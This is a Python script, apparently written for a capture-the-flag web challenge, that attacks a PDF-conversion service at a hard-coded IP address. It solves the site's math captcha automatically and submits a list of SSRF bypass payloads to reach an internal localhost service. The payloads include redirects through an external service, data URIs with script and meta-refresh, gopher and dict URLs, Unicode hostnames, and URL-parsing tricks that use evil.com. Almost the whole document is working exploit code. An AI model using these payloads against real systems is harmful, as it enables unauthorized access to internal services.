#!/usr/bin/env python3
"""
Web 2 Doc 1 - Different SSRF approaches

Since direct localhost access is blocked, let's try:
1. Redirect-based SSRF (host our own server that redirects)
2. Data URI with JavaScript
3. File protocol variations
"""

import requests
import re
import http.server
import threading
import time

BASE_URL = "http://52.59.124.14:5002"

def get_captcha(session):
    """Get the main page and extract the captcha challenge."""
    resp = session.get(f"{BASE_URL}/")
    # Look for: Math Challenge: X OP Y = ?
    match = re.search(r'Math Challenge:\s*(\d+)\s*([+\-*])\s*(\d+)\s*=', resp.text)
    if match:
        a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
        if op == '+':
            return a + b
        elif op == '-':
            return a - b
        elif op == '*':
            return a * b
    return None

def ssrf_fetch(session, internal_url):
    """Use the PDF converter to fetch an internal URL via SSRF."""
    captcha = get_captcha(session)
    if captcha is None:
        print("[!] Could not solve captcha")
        return None
    
    resp = session.post(f"{BASE_URL}/convert", data={
        "url": internal_url,
        "captcha_answer": str(captcha)
    })
    
    return resp

def main():
    session = requests.Session()
    
    # More bypass techniques
    bypass_urls = [
        # Redirect via external service
        # https://httpbingo.org/redirect-to?url=http://127.0.0.1:5002/
        "https://httpbingo.org/redirect-to?url=http://127.0.0.1:5002/",
        
        # Data URI with meta refresh
        "data:text/html,<meta http-equiv='refresh' content='0;url=http://127.0.0.1:5002/'>",
        
        # Data URI with JavaScript
        "data:text/html,<script>location='http://127.0.0.1:5002/'</script>",
        
        # Using other protocols that might work with PDF library
        # Sometimes gopher works
        "gopher://127.0.0.1:5002/_GET%20/%20HTTP/1.1%0D%0A%0D%0A",
        
        # Try dict protocol 
        "dict://127.0.0.1:5002/",
        
        # IDNA/Unicode domain tricks
        "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ:5002/",
        
        # Browser URL parsing quirks
        "http://127.0.0.1%00.evil.com:5002/",
        "http://127.0.0.1%0d%0a.evil.com:5002/",
        
        # URL fragments
        "http://evil.com#@127.0.0.1:5002/",
        
        # Backslash parsing
        "http://evil.com\\@127.0.0.1:5002/",
        
        # Short URL services that could redirect
        # (Not practical for CTF but for completeness)
    ]
    
    print("[*] Testing more SSRF bypasses...\n")
    
    for url in bypass_urls:
        resp = ssrf_fetch(session, url)
        if resp is None:
            print(f"[-] {url[:60]:60s} -> Captcha failed")
            continue
        
        status = resp.status_code
        content_type = resp.headers.get('Content-Type', 'unknown')
        
        if status == 200 and 'pdf' in content_type.lower():
            print(f"[+] {url[:60]:60s} -> SUCCESS! PDF {len(resp.content)} bytes")
            # Save the PDF to check what's in it
            with open(f"test_{bypass_urls.index(url)}.pdf", "wb") as f:
                f.write(resp.content)
        else:
            try:
                error = resp.json().get('error', 'unknown')[:30]
            except:
                error = resp.text[:30]
            print(f"[-] {url[:60]:60s} -> {status} {error}")

if __name__ == "__main__":
    main()
